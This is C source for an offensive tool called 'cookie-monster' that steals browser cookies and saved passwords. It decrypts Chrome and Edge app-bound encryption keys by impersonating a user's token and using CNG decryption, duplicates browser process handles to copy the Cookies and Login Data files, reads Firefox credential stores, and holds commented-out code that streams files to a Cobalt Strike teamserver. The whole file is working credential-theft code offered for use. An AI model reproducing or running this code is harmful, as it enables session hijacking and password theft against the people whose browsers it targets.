//     packedData[5] = (fileLength >> 0x10) & 0xFF;
//     packedData[6] = (fileLength >> 0x08) & 0xFF;
//     packedData[7] = (fileLength >> 0x00) & 0xFF;

//     // pack on the file name last
//     for (int i = 0; i < fileNameLength; i++)
//     {
//         packedData[8 + i] = fileName[i];
//     }

//     // tell the teamserver that we want to download a file
//     BeaconOutput(CALLBACK_FILE,packedData,messageLength);
//     DATA_FREE(packedData, messageLength);

//     // we use the same memory region for all chucks
//     int chunkLength = 4 + CHUNK_SIZE;
//     char* packedChunk = intAlloc(chunkLength);
//     if (!packedChunk)
//     {
//         printf("Could not allocate memory for the file. Last Error %d", GetLastError());
//         return FALSE;
//     }
//     // the fileId is the same for all chunks
//     packedChunk[0] = (fileId >> 0x18) & 0xFF;
//     packedChunk[1] = (fileId >> 0x10) & 0xFF;
//     packedChunk[2] = (fileId >> 0x08) & 0xFF;
//     packedChunk[3] = (fileId >> 0x00) & 0xFF;

//     ULONG32 exfiltrated = 0;
//     while (exfiltrated < fileLength)
//     {
//         // send the file content by chunks
//         chunkLength = fileLength - exfiltrated > CHUNK_SIZE ? CHUNK_SIZE : fileLength - exfiltrated;
//         ULONG32 chunkIndex = 4;
//         for (ULONG32 i = exfiltrated; i < exfiltrated + chunkLength; i++)
//         {
//             packedChunk[chunkIndex++] = fileData[i];
//         }
//         // send a chunk
//         BeaconOutput(
//             CALLBACK_FILE_WRITE,
//             packedChunk,
//             4 + chunkLength);
//         exfiltrated += chunkLength;
//     }
//     DATA_FREE(packedChunk, chunkLength);

//     // tell the teamserver that we are done writing to this fileId
//     char packedClose[4];
//     packedClose[0] = (fileId >> 0x18) & 0xFF;
//     packedClose[1] = (fileId >> 0x10) & 0xFF;
//     packedClose[2] = (fileId >> 0x08) & 0xFF;
//     packedClose[3] = (fileId >> 0x00) & 0xFF;
//     BeaconOutput(
//         CALLBACK_FILE_CLOSE,
//         packedClose,
//         4);
//     printf("The file was downloaded filessly");
//     return TRUE;
// }

// Helper functions for string operations - Chrome style
BOOL PopFromStringFront(BYTE** data, DWORD* data_len, DWORD pop_len, BYTE* output) {
    // Check if we have enough data
    if (*data_len < pop_len) {
        return FALSE;
    }

    // Copy the data if output buffer is provided
    if (output != NULL) {
        memcpy(output, *data, pop_len);
    }

    // Move the pointer forward
    *data += pop_len;
    *data_len -= pop_len;
    
    return TRUE;
}

BOOL PopDWORDFromStringFront(BYTE** data, DWORD* data_len, DWORD* output) {
    if (*data_len < sizeof(DWORD)) {
        return FALSE;
    }

    if (output != NULL) {
        *output = *((DWORD*)*data);
    }

    *data += sizeof(DWORD);
    *data_len -= sizeof(DWORD);
    
    return TRUE;
}

BYTE* decrypt_with_cng(const BYTE* input_data, DWORD input_size, DWORD* output_size) {
    NCRYPT_PROV_HANDLE hProvider = 0;
    NCRYPT_KEY_HANDLE hKey = 0;
    BYTE* output_buffer = NULL;
    DWORD buffer_size = 0;
    SECURITY_STATUS status;
    
    // Initialize output size
    *output_size = 0;
    
    // Open storage provider
    LPCWSTR provider_name = L"Microsoft Software Key Storage Provider";
    status = NCryptOpenStorageProvider(&hProvider, provider_name, 0);
    if (status != ERROR_SUCCESS) {
        printf("NCryptOpenStorageProvider failed with status 0x%08X\n", status);
        return NULL;
    }
    
    // Open key
    LPCWSTR key_name = L"Google Chromekey1";
    status = NCryptOpenKey(hProvider, &hKey, key_name, 0, 0);
    if (status != ERROR_SUCCESS) {
        printf("NCryptOpenKey failed with status 0x%08X\n", status);
        NCryptFreeObject(hProvider);
        return NULL;
    }
    
    // First call to get required buffer size
    status = NCryptDecrypt(
        hKey,
        (PBYTE)input_data,
        input_size,
        NULL,                    // pPaddingInfo
        NULL,                    // pbOutput (NULL to get size)
        0,                       // cbOutput
        &buffer_size,            // pcbResult
        NCRYPT_SILENT_FLAG       // dwFlags (0x40)
    );
    
    if (status != ERROR_SUCCESS) {
        printf("1st NCryptDecrypt failed with status 0x%08X\n", status);
        NCryptFreeObject(hKey);
        NCryptFreeObject(hProvider);
        return NULL;
    }
    
    // Allocate output buffer
    output_buffer = (BYTE*)malloc(buffer_size);
    if (!output_buffer) {
        printf("Memory allocation failed\n");
        NCryptFreeObject(hKey);
        NCryptFreeObject(hProvider);
        return NULL;
    }
    
    // Second call to actually decrypt
    status = NCryptDecrypt(
        hKey,
        (PBYTE)input_data,
        input_size,
        NULL,                    // pPaddingInfo
        output_buffer,           // pbOutput
        buffer_size,             // cbOutput
        &buffer_size,            // pcbResult (actual bytes written)
        NCRYPT_SILENT_FLAG       // dwFlags (0x40)
    );
    
    if (status != ERROR_SUCCESS) {
        printf("2nd NCryptDecrypt failed with status 0x%08X\n", status);
        free(output_buffer);
        output_buffer = NULL;
        buffer_size = 0;
    }
    
    // Clean up
    NCryptFreeObject(hKey);
    NCryptFreeObject(hProvider);
    
    // Set output size
    *output_size = buffer_size;
    
    return output_buffer;
}

BOOL AppBoundDecryptor(char * localStateFile, int pid){
    IMPORT_RESOLVE;

    char * app_data = GetFileContent(localStateFile);
    CHAR app_pattern[] =  "\"app_bound_encrypted_key\":\"";
    if(app_data == NULL) {
        printf("Reading the file failed.\n");
        return FALSE;
    }
    char * app_key = ExtractKey(app_data, app_pattern);

    // Base64 decode the app_bound_encrypted_key
    size_t encrypted_key_len;
    uint8_t* encrypted_key_with_header = Base64Decode(app_key, &encrypted_key_len);
    if (encrypted_key_with_header == NULL) {
        printf("Failed to base64 decode the key\n");
        GlobalFree(app_data);
        GlobalFree(app_key);
        return FALSE;
    }
    
    // Validate key prefix (APPB)
    if (encrypted_key_len < sizeof(kCryptAppBoundKeyPrefix) || memcmp(encrypted_key_with_header, kCryptAppBoundKeyPrefix, sizeof(kCryptAppBoundKeyPrefix)) != 0) {
        printf("Invalid key header - expected 'APPB' prefix\n");
        free(encrypted_key_with_header);
        GlobalFree(app_data);
        GlobalFree(app_key);
        return FALSE;
    }
    
    // Strip prefix
    uint8_t* encrypted_key = (uint8_t*)malloc(encrypted_key_len - sizeof(kCryptAppBoundKeyPrefix));
    if (encrypted_key == NULL) {
        printf("Failed to allocate memory for encrypted key\n");
        free(encrypted_key_with_header);
        GlobalFree(app_data);
        GlobalFree(app_key);
        return FALSE;
    }
    
    memcpy(encrypted_key, encrypted_key_with_header + sizeof(kCryptAppBoundKeyPrefix), encrypted_key_len - sizeof(kCryptAppBoundKeyPrefix));
    encrypted_key_len -= sizeof(kCryptAppBoundKeyPrefix);
    free(encrypted_key_with_header);

    // First, attempt to decrypt as SYSTEM
    printf("Attempting to decrypt key as SYSTEM...\n");
    BYTE* decrypted_key = NULL;
    DWORD decrypted_key_len = 0;
    
    DATA_BLOB encrypted_blob;
    DATA_BLOB intermediate_blob;
    DATA_BLOB decrypted_blob;
    
    encrypted_blob.pbData = encrypted_key;
    encrypted_blob.cbData = encrypted_key_len;
    HANDLE hUser = NULL;
    HANDLE hToken = NULL;
    HANDLE hProcess = NULL;
    
    BOOL result = CryptUnprotectData(&encrypted_blob, NULL, NULL, NULL, NULL, 0, &intermediate_blob);
    if (result) {
        printf("Attempting to impersonate user to decrypt...\n");
        
        // Impersonate the user
        hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pid);
        if (hProcess == NULL) {
            printf("Failed to open process: %lu\n", GetLastError());
            free(encrypted_key);
            GlobalFree(app_data);
            GlobalFree(app_key);
            return FALSE;
        }
        
        if (!OpenProcessToken(hProcess, TOKEN_QUERY | TOKEN_DUPLICATE, &hToken)) {
            printf("Failed to open process token: %lu\n", GetLastError());
            CloseHandle(hProcess);
            free(encrypted_key);
            GlobalFree(app_data);
            GlobalFree(app_key);
            return FALSE;
        }
        
        if (!DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS,NULL, SecurityImpersonation, TokenPrimary, &hUser)) {
            printf("Failed to duplicate token: %lu\n", GetLastError());
            CloseHandle(hToken);
            CloseHandle(hProcess);
            free(encrypted_key);
            GlobalFree(app_data);
            GlobalFree(app_key);
            return FALSE;
        }
        
        if (!ImpersonateLoggedOnUser(hUser)) {
            printf("Failed to impersonate user: %lu\n", GetLastError());
            CloseHandle(hToken);
            CloseHandle(hProcess);
            CloseHandle(hUser);
            free(encrypted_key);
            GlobalFree(app_data);
            GlobalFree(app_key);
            return FALSE;
        }
        
        printf("Successfully impersonated user with PID: %d\n", pid);
        
        // Now try to decrypt as impersonated user
        result = CryptUnprotectData(&intermediate_blob, NULL, NULL, NULL, NULL, 0, &decrypted_blob);
        if (!result) {
            printf("Decrypting as impersonated user failed: %lu\n", GetLastError());
            RevertToSelf();
            CloseHandle(hToken);
            CloseHandle(hProcess);
            CloseHandle(hUser);
            free(encrypted_key);
            GlobalFree(app_data);
            GlobalFree(app_key);
            return FALSE;
        }
        
        printf("Successfully decrypted key as impersonated user!\n");
    } else {
        printf("Failed to decrypt key as SYSTEM!\n");
        free(encrypted_key);
        GlobalFree(app_data);
        GlobalFree(app_key);
        return FALSE;
    }

    // Revert impersonation
    if (hUser != NULL) {
        RevertToSelf();
        CloseHandle(hToken);
        CloseHandle(hProcess);
        CloseHandle(hUser);
        printf("Rev2Self\n");
    }
    
    // Parse the decrypted data - Chrome format
    BYTE* cursor = decrypted_blob.pbData;
    DWORD remaining = decrypted_blob.cbData;
    DWORD validation_len = 0;

    // Get validation string length
    if (!PopDWORDFromStringFront(&cursor, &remaining, &validation_len)) {
        printf("Failed to read validation length.\n");
        LocalFree(decrypted_blob.pbData);
        free(encrypted_key);
        GlobalFree(app_data);
        GlobalFree(app_key);
        return FALSE;
    }
    
    if (validation_len > remaining) {
        printf("Validation length (%lu) exceeds remaining data (%lu).\n", validation_len, remaining);
        LocalFree(decrypted_blob.pbData);
        free(encrypted_key);
        GlobalFree(app_data);
        GlobalFree(app_key);
        return FALSE;
    }
    
    // Get validation string
    BYTE* validation_blob = cursor;
    if (!PopFromStringFront(&cursor, &remaining, validation_len, NULL)) {
        printf("Failed to extract validation blob.\n");
        LocalFree(decrypted_blob.pbData);
        free(encrypted_key);
        GlobalFree(app_data);
        GlobalFree(app_key);
        return FALSE;
    }
    
    // Get key length
    DWORD key_len = 0;
    if (!PopDWORDFromStringFront(&cursor, &remaining, &key_len)) {
        printf("Failed to read key length.\n");
        LocalFree(decrypted_blob.pbData);
        free(encrypted_key);
        GlobalFree(app_data);
        GlobalFree(app_key);
        return FALSE;
    }
    
    if (key_len > remaining) {
        printf("Key length (%lu) exceeds remaining data (%lu).\n", key_len, remaining);
        LocalFree(decrypted_blob.pbData);
        free(encrypted_key);
        GlobalFree(app_data);
        GlobalFree(app_key);
        return FALSE;
    }
    
    // Get key blob
    BYTE* key_blob = cursor;
    
        // if first byte is 03 then decyrpt with CNG
        if (key_blob[0] == 0x03) {
            printf("Decrypting key with CNG...");
            BYTE* aes_encrypted_key = key_blob + 1;  // skip flag
            DWORD cng_out_len = 0;
            BYTE *decrypted = decrypt_with_cng(aes_encrypted_key, 32, &cng_out_len);
            if (decrypted) {
                CHAR *chromeOutput = (CHAR*)GlobalAlloc(GPTR, (key_len * 4) + 1);
                printf("CNG Decryption Output (%lu bytes):\n", cng_out_len);
                
                for (DWORD i = 0; i < cng_out_len; i++) {
                    sprintf(chromeOutput, "%s\\x%02x", chromeOutput, decrypted[i]);
                }
                
                printf("Chrome AES Key: %s \n", chromeOutput );
    
                free(decrypted);
                GlobalFree(chromeOutput);
    
            } else {
                printf("CNG decryption failed.\n");
            }
    
        }
        printf("Decrypted Key (%lu bytes):\n", key_len);
        CHAR *output = (CHAR*)GlobalAlloc(GPTR, (key_len * 4) + 1);
       
        for (DWORD i = 0; i < key_len; i++) {
            sprintf(output, "%s\\x%02x", output, key_blob[i]);
        }
         
        printf("Decrypt Key: %s \n", output );
    
    
    // Clean up
    LocalFree(decrypted_blob.pbData);
    LocalFree(intermediate_blob.pbData);
    free(encrypted_key);
    GlobalFree(app_data);
    GlobalFree(app_key);
    GlobalFree(output);
    
    return TRUE;
    
}


void print_usage() {
    printf("Usage: cookie-monster [--chrome || --edge || --system <Local State File Path> <PID> || --firefox || --chromeCookiePID <PID> || --chromeLoginDataPID <PID> || --edgeCookiePID <PID> || --edgeLoginDataPID <PID> ] [--cookie-only] [--key-only] [--login-data-only] [--copy-file \"C:\\Folder\\Location\\\"]\n");
    printf("cookie-monster Examples:\n");
    printf("   cookie-monster --chrome\n");
    printf("   cookie-monster --edge\n");
    printf("   cookie-monster --system \"C:\\Users\\<USER>\\AppData\\Local\\<BROWSER>\\User Data\\Local State\" <PID>\n");
    printf("   cookie-monster --firefox\n");
    printf("   cookie-monster --chromeCookiePID <PID>\n");
    printf("   cookie-monster --chromeLoginDataPID <PID>\n");
    printf("   cookie-monster --edgeCookiePID <PID>\n");
    printf("   cookie-monster --edgeLoginDataPID <PID>\n");
    printf("cookie-monster Options:\n");
    printf("    --chrome, looks at all running processes and handles, if one matches chrome.exe it copies the handle to cookies and then copies the file to the CWD\n");
    printf("    --edge, looks at all running processes and handles, if one matches msedge.exe it copies the handle to cookies and then copies the file to the CWD\n");
    printf("    --system, Decrypt chromium based browser app bound encryption key without injecting into browser. Requires path to Local State file and PID of a user process for impersonation\n");
    printf("    --firefox, looks for profiles.ini and locates the key4.db and logins.json file\n");
    printf("    --chromeCookiePID, if chrome PID is provided look for the specified process with a handle to cookies is known, specify the pid to duplicate its handle and file\n");
    printf("    --chromeLoginDataPID, if chrome PID is provided look for the specified process with a handle to Login Data is known, specify the pid to duplicate its handle and file\n");
    printf("    --edgeCookiePID, if edge PID is provided look for the specified process with a handle to cookies is known, specify the pid to duplicate its handle and file\n");
    printf("    --edgeLoginDataPID, if edge PID is provided look for the specified process with a handle to Login Data is known, specify the pid to duplicate its handle and file\n");
    printf("    --key-only, only retrieve the app bound encryption key. Do not attempt to download the Cookie or Login Data files.\n");
    printf("    --cookie-only, only retrieve the Cookie file. Do not attempt to download Login Data file or retrieve app bound encryption key.\n");
    printf("    --login-data-only, only retrieve the Login Data file. Do not attempt to download Cookie file or retrieve app bound encryption key.\n");
    printf("    --copy-file, copies the Cookie and Login Data file to the folder specified. Does not use fileless retrieval method.\n");
}


int main(int argc, char *argv[]) {
    CookieMonsterArgs args = {0};
    args.copyFile = "";
    args.localStateFile = "";
    int ret_code = 0;
    char defaultPath[MAX_PATH_LEN];

    // parse the command line args and put into struct
    for (int i = 1; i < argc; i++) {
        if (strcmp(argv[i], "--chrome") == 0) {
            args.chrome = 1;
        } else if (strcmp(argv[i], "--edge") == 0) {
            args.edge = 1;
        } else if (strcmp(argv[i], "--system") == 0 && i + 2 < argc) {
            args.system = 1;
            args.localStateFile = argv[++i];
            args.pid = atoi(argv[++i]);
        } else if (strcmp(argv[i], "--firefox") == 0) {
            args.firefox = 1;
        } else if (strcmp(argv[i], "--chromeCookiePID") == 0 && i + 1 < argc) {
            args.chromeCookiesPID = atoi(argv[++i]);
        } else if (strcmp(argv[i], "--chromeLoginDataPID") == 0 && i + 1 < argc) {
            args.chromeLoginDataPID = atoi(argv[++i]);
        } else if (strcmp(argv[i], "--edgeCookiePID") == 0 && i + 1 < argc) {
            args.edgeCookiesPID = atoi(argv[++i]);
        } else if (strcmp(argv[i], "--edgeLoginDataPID") == 0 && i + 1 < argc) {
            args.edgeLoginDataPID = atoi(argv[++i]);
        } else if (strcmp(argv[i], "--key-only") == 0) {
            args.keyOnly = 1;
        } else if (strcmp(argv[i], "--cookie-only") == 0) {
            args.cookieOnly = 1;
        } else if (strcmp(argv[i], "--login-data-only") == 0) {
            args.loginDataOnly = 1;
        } else if (strcmp(argv[i], "--copy-file") == 0 && i + 1 < argc) {
            args.copyFile = argv[++i];
        } else {
            printf("Unknown or incomplete argument: %s\n", argv[i]);
            return 1;
        }
    }

    if (args.copyFile == NULL || strlen(args.copyFile) == 0) {
        args.copyFile = DEFAULT_COPY_PATH;
        printf("[INFO] No --copy-file path provided. Defaulting to: %s\n", args.copyFile);
    }


    int chrome = args.chrome;
    int edge = args.edge; 
    int system = args.system;
    int firefox = args.firefox;
    int chromeCookiesPID = args.chromeCookiesPID;
    int chromeLoginDataPID = args.chromeLoginDataPID;
    int edgeCookiesPID = args.edgeCookiesPID;
    int edgeLoginDataPID = args.edgeLoginDataPID;
    int pid = args.pid; 
    int keyOnly = args.keyOnly;
    int cookieOnly = args.cookieOnly;
    int loginDataOnly = args.loginDataOnly;
    char * copyFile = args.copyFile;
    char * localStateFile = args.localStateFile;
    BOOL status = FALSE;

    if (!copyFile){
        printf("[ERROR] --copy-file must be supplied.");
    }

    if (chrome == 1 ){
        printf("[DEBUG] CHROME SELECTED\n");
        if (keyOnly == 1){
            printf("[DEBUG] KEY ONLY SELECTED\n");
            GetEncryptionKey("chrome");
            return 0;
        }
        if (cookieOnly == 1 || loginDataOnly == 1){
            printf("[DEBUG] COOKIES ONLY SELECTED\n");
            GetBrowserData("chrome", cookieOnly, loginDataOnly, copyFile);
            return 0;
        }
        GetEncryptionKey("chrome");
        GetBrowserData("chrome", cookieOnly, loginDataOnly, copyFile);
        
        return 0;
    }
    else if (edge == 1 ){
        printf("[DEBUG] EDGE SELECTED\n");
        if (keyOnly == 1){
            GetEncryptionKey("msedge");
            return 0;
        }
        if (cookieOnly == 1 || loginDataOnly == 1){
            GetBrowserData("msedge", cookieOnly, loginDataOnly, copyFile);
            return 0;
        }
        GetEncryptionKey("msedge");
        GetBrowserData("msedge", cookieOnly, loginDataOnly, copyFile);
        return 0;
    }
    else if (system == 1){
        printf("[DEBUG] SYSTEM SELECTED\n");
        //if key only, then get the key and exit
        if (keyOnly == 1){
            AppBoundDecryptor(localStateFile, pid);
            return 0;
        }
        //if cookie or login data only, then get the cookies and/or passwords and exit
        if (cookieOnly == 1 || loginDataOnly == 1){
            if (StrStrIA(localStateFile, "chrome") != NULL) {
                printf("[DEBUG] Getting Chrome Cookies and Passwords");
                GetBrowserData("chrome", cookieOnly, loginDataOnly, copyFile);
            }
            if (StrStrIA(localStateFile, "edge") != NULL) {
                printf("[DEBUG] Getting Edge Cookies and Passwords");
                GetBrowserData("msedge", cookieOnly, loginDataOnly, copyFile);
            }
            return 0;
        }
        
        if(AppBoundDecryptor(localStateFile, pid)){
            if (StrStrIA(localStateFile, "chrome") != NULL) {
                printf("[DEBUG] Getting Chrome Cookies and Passwords");
                GetBrowserData("chrome", cookieOnly, loginDataOnly, copyFile);
            }
            if (StrStrIA(localStateFile, "edge") != NULL) {
                printf("[DEBUG] Getting Edge Cookies and Passwords");
                GetBrowserData("msedge", cookieOnly, loginDataOnly, copyFile);
            }
        }
        return 0;
    }
    else if (firefox == 1 ){
        printf("[DEBUG] FIREFOX SELECTED");
        GetFirefoxInfo();
        return 0;
    }
    else if (chromeCookiesPID == 1){
        printf("[DEBUG] CHROME Cookies SELECTED");
        printf("[DEBUG] PID: %d", pid);
        //if key only, then get the key and exit
        if (keyOnly == 1){
            GetEncryptionKey("chrome");
            return 0;
        }
        //if cookie or login data only, then get the cookies and/or passwords and exit
        if (cookieOnly == 1){
            GetBrowserFile(pid, "Cookies", "ChromeCookies.db", copyFile);
            return 0;
        }
        GetEncryptionKey("chrome");
        GetBrowserFile(pid, "Cookies", "ChromeCookie.db", copyFile);
        return 0;
    }
    else if (chromeLoginDataPID == 1){
        printf("[DEBUG] CHROME Login Data SELECTED\n");
        printf("[DEBUG] PID: %d\n", pid);
        //if key only, then get the key and exit
        if (keyOnly == 1){
            GetEncryptionKey("chrome");
            return 0;
        }
        //if cookie or login data only, then get the cookies and/or passwords and exit
        if (loginDataOnly == 1){
            GetBrowserFile(pid, "Login Data", "ChromePasswords.db", copyFile);
            return 0;
        }
        GetEncryptionKey("chrome");
        GetBrowserFile(pid, "Login Data", "ChromePasswords.db", copyFile);
        return 0;
    }
    else if (edgeCookiesPID == 1){
        printf("[DEBUG] EDGE Cookies SELECTED");
        printf("[DEBUG] PID: %d", pid);
        //if key only, then get the key and exit
        if (keyOnly == 1){
            GetEncryptionKey("msedge");
            return 0;
        }
        //if cookie or login data only, then get the cookies and/or passwords and exit
        if (cookieOnly == 1){
            GetBrowserFile(pid, "Cookies", "EdgeCookies.db", copyFile);
            return 0;
        }
        GetEncryptionKey("msedge");
        GetBrowserFile(pid, "Cookies", "EdgeCookie.db", copyFile);
        return 0;
    }
    else if (edgeLoginDataPID == 1){
        printf("[DEBUG] EDGE Login Data SELECTED");
        printf("[DEBUG] PID: %d", pid);
        //if key only, then get the key and exit
        if (keyOnly == 1){
            GetEncryptionKey("msedge");
            return 0;
        }
        //if cookie or login data only, then get the cookies and/or passwords and exit
        if (loginDataOnly == 1){
            GetBrowserFile(pid, "Login Data", "EdgePasswords.db", copyFile);
            return 0;
        }
        GetEncryptionKey("msedge");
        GetBrowserFile(pid, "Login Data", "EdgePasswords.db", copyFile);
        return 0;
    }
    else{
        printf("[ERROR] NOTHING SELECTED\n");
        print_usage();
        return 1;
    }
}

